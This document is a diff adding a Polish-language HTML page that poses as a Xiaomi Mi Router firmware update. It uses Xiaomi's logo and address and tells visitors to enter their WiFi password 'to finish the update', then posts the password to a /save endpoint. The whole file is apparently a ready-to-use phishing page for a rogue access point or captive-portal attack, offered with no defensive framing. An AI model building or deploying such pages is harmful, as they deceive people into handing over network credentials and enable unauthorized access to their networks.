@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="pl">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Aktualizacja systemu - Xiaomi Router</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        background-color: #f7f7f7;
+        font-family: Arial, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+      }
+
+      .container {
+        background: white;
+        padding: 20px;
+        max-width: 320px;
+        width: 90%;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        text-align: center;
+      }
+
+      .logo {
+        margin-bottom: 12px;
+      }
+
+      .logo img {
+        max-width: 80px;
+        height: auto;
+      }
+
+      .header {
+        color: #ff6b00;
+        font-size: 1.3em;
+        margin-bottom: 10px;
+      }
+
+      .message {
+        color: #444;
+        font-size: 0.95em;
+        margin-bottom: 20px;
+      }
+
+      input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        font-size: 1em;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+      }
+
+      button {
+        width: 100%;
+        padding: 10px;
+        background-color: #ff6b00;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 1em;
+        cursor: pointer;
+      }
+
+      .footer {
+        margin-top: 15px;
+        font-size: 0.8em;
+        color: #aaa;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNi4wLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iNTEycHgiIGhlaWdodD0iNTEycHgiIHZpZXdCb3g9Ii0yMDAuMDA4IC0xOTkuNzI3IDUxMiA1MTIiIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgLTIwMC4wMDggLTE5OS43MjcgNTEyIDUxMiINCgkgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8Zz4NCgk8Zz4NCgkJPGc+DQoJCQk8cGF0aCBpZD0i6Lev5b6EXzFfIiBmaWxsPSIjRkY2OTAwIiBkPSJNMjU4LjYyNi0xNDYuMjMxYy00OC4zMDQtNDguMTE4LTExNy43NTktNTMuNDk2LTIwMi42MzQtNTMuNDk2DQoJCQkJYy04NC45ODIsMC0xNTQuNTQyLDUuNDQtMjAyLjgyNiw1My42ODhjLTQ4LjI3Nyw0OC4yMjgtNTMuMTc0LDExNy42NzYtNTMuMTc0LDIwMi41NjFjMCw4NC44OTksNC44OTcsMTU0LjM2OCw1My4xOTQsMjAyLjYxMw0KCQkJCWM0OC4yODEsNDguMjU1LDExNy44MzMsNTMuMTM5LDIwMi44MDYsNTMuMTM5Yzg0Ljk3NCwwLDE1NC41MTQtNC44ODQsMjAyLjc5NS01My4xMzkNCgkJCQljNDguMjk0LTQ4LjI1NCw1My4yMDUtMTE3LjcxNCw1My4yMDUtMjAyLjYxM0MzMTEuOTkyLTI4LjQ3MiwzMDcuMDI4LTk3Ljk5NSwyNTguNjI2LTE0Ni4yMzFMMjU4LjYyNi0xNDYuMjMxeiIvPg0KCQk8L2c+DQoJPC9nPg0KCTxnPg0KCQk8Zz4NCgkJCTxwYXRoIGlkPSLlvaLnirbnu5PlkIgiIGZpbGw9IiNGRkZGRkYiIGQ9Ik0yMDQuNTQ2LTQxLjEyMmMxLjc1OSwwLDMuMjIzLDEuNDE3LDMuMjIzLDMuMTYxdjE4OS4zODYNCgkJCQljMCwxLjcxNS0xLjQ2NCwzLjEzOS0zLjIyMywzLjEzOUgxNjMuMDVjLTEuNzgxLDAtMy4yMjgtMS40MjQtMy4yMjgtMy4xMzlWLTM3Ljk2MWMwLTEuNzQzLDEuNDQ2LTMuMTYxLDMuMjI4LTMuMTYxSDIwNC41NDZ6DQoJCQkJIE0yNC40NjgtNDEuMTIyYzMxLjMwMywwLDY0LjAzMywxLjQzNSw4MC4xNzYsMTcuNTg5YzE1Ljg3MSwxNS44OTcsMTcuNTksNDcuNTQ5LDE3LjY1Niw3OC4yODZ2OTYuNjcxDQoJCQkJYzAsMS43MTUtMS40NDYsMy4xMzktMy4yMTksMy4xMzloLTQxLjQ5Yy0xLjc3NywwLTMuMjI5LTEuNDI0LTMuMjI5LTMuMTM5VjUzLjA5Yy0wLjA0NC0xNy4xNjctMS4wMzEtMzQuODEtOS44ODQtNDMuNjkyDQoJCQkJYy03LjYyLTcuNjQxLTIxLjgzOS05LjM5MS0zNi42MjUtOS43NTRoLTc1LjIxYy0xLjc2NCwwLTMuMjA4LDEuNDE5LTMuMjA4LDMuMTM2djE0OC42NDVjMCwxLjcxNS0xLjQ2MiwzLjEzOS0zLjIzNywzLjEzOQ0KCQkJCWgtNDEuNTE2Yy0xLjc3NCwwLTMuMjAxLTEuNDI0LTMuMjAxLTMuMTM5Vi0zNy45NjFjMC0xLjc0MywxLjQyNi0zLjE2MSwzLjIwMS0zLjE2MUgyNC40Njh6IE0zMy43NTUsMzQuMzA1DQoJCQkJYzEuNzY2LDAsMy4yMDEsMS40MTMsMy4yMDEsMy4xNDN2MTEzLjk3N2MwLDEuNzE1LTEuNDM2LDMuMTM5LTMuMjAxLDMuMTM5SC05LjgyOWMtMS43OTIsMC0zLjIyOC0xLjQyNC0zLjIyOC0zLjEzOVYzNy40NDgNCgkJCQljMC0xLjczLDEuNDM2LTMuMTQzLDMuMjI4LTMuMTQzSDMzLjc1NXoiLz4NCgkJPC9nPg0KCTwvZz4NCjwvZz4NCjwvc3ZnPg0K" alt="Xiaomi Logo"/>
+      </div>
+      <div class="header">Xiaomi Update</div>
+      <div class="message">
+        Automatyczna aktualizacja oprogramowania Xiaomi Mi Router.<br/>
+        Aby zakończyć proces wpisz hasło do sieci WiFi.
+      </div>
+      <form method="POST" action="/save">
+        <input type="password" name="wifi_password" placeholder="Hasło do WiFi" required />
+        <button type="submit">Kontynuuj</button>
+      </form>
+      <div class="footer">System firmware update v2.6.3</div>
+      <div class="footer">Xiaomi - #019, 9th Floor, Building 6, 33 Xi'erqi Middle Road, Haidian District, Beijing, China</div>
+    </div>
+  </body>
+</html>
